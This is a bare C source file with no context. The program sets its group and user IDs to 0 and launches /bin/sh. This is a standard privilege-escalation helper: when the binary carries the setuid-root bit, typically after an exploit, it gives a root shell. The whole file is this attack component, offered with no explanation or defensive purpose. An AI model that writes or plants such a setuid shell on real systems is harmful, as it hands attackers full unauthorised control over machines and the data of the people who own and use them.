int main()
{	setgid(0);
	setuid(0);
	system("/bin/sh");
	return 0;
}
